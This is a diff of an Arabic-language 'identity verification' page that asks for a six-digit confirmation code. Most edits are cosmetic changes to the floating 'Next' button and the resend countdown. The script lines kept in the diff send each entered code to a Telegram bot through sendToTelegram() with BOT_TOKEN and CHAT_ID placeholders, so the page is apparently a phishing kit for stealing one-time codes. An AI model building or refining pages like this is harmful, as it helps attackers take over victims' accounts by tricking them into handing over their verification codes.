@@ -1,4 +1,6 @@
-<html lang="ar" dir="rtl"><head>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>التحقق من الهوية</title>
@@ -88,8 +90,8 @@ html, body {
 .code-inputs input {
   /* responsive width that fits the available space for 6 boxes + gaps */
   width: calc((100% - 60px) / 6); /* 100% minus total gaps (5*12=60px) */
-  max-width: 28px;
-  min-width: 15px;
+  max-width: 34px;
+  min-width: 20px;
   aspect-ratio: 1 / 1; /* keep square */
   border-radius: 8px;
   border: 1px solid #e6e6e8;
@@ -113,10 +115,11 @@ html, body {
   position: fixed;
   left: 0;
   right: 0;
-  bottom: 20px;
+  bottom: 34px; /* رفع الزر قليلاً ليصبح عائم ويمنع الانزلاق */
   display: flex;
   justify-content: center;
-  pointer-events: none;
+  pointer-events: auto; /* السماح بالنقر */
+  z-index: 10000; /* فوق بقية العناصر */
 }
 .bottom-inner {
   width: 100%;
@@ -150,15 +153,20 @@ html, body {
 #resendText.active { color: #444; cursor: pointer; }
 
 #nextBtn {
-  width: 100%;
-  border-radius: 8px;
-  padding: 16px 18px;
+  width: calc(100% - 40px);
+  max-width: 420px;
+  border-radius: 12px;
+  padding: 14px 18px;
   background: #efefef;
   border: none;
   font-size: 18px;
   color: #bdbdbd;
   font-weight: 700;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.12); /* ظل ليبدو عائماً */
+  transform: translateY(-6px);
+  transition: transform 0.12s, box-shadow 0.12s, background 0.12s;
 }
+#nextBtn.active { background: #ff6a2b; color: #fff; box-shadow: 0 14px 40px rgba(255,106,43,0.18); transform: translateY(-6px); }
 #nextBtn.active { background: #ff6a2b; color: #fff; }
 
 /* responsive tweaks for small phones */
@@ -170,7 +178,7 @@ html, body {
   .circle svg { width: 40px; height: 40px; }
 }
 </style>
-<style type="text/css" id="operaUserStyle"></style></head>
+</head>
 <body>
 <div class="wrap">
   <div class="header-top">
@@ -200,11 +208,11 @@ html, body {
         <div class="circle">
           <svg>
             <circle class="bg" cx="24" cy="24" r="18"></circle>
-            <circle class="progress" cx="24" cy="24" r="18" style="stroke-dasharray: 113.097; stroke-dashoffset: 113.097;"></circle>
+            <circle class="progress" cx="24" cy="24" r="18"></circle>
           </svg>
-          <span id="countdown">0</span>
+          <span id="countdown">60</span>
         </div>
-        <div id="resendText" class="active">أعد إرسال رمز التأكيد</div>
+        <div id="resendText">أعد إرسال رمز التأكيد</div>
       </div>
 
       <button id="nextBtn">التالي</button>
@@ -321,6 +329,5 @@ nextBtn.addEventListener('click', ()=>{
   if (code.length===6){ sendToTelegram(code).catch(()=>{}); if (!BOT_TOKEN || BOT_TOKEN.includes('ضع_هنا') || !CHAT_ID || CHAT_ID.includes('ضع_هنا')) return; alert('🚀 تم إرسال رمز التأكيد إلى تلجرام'); }
 });
 </script>
-
-
-</body></html>
+</body>
+</html>
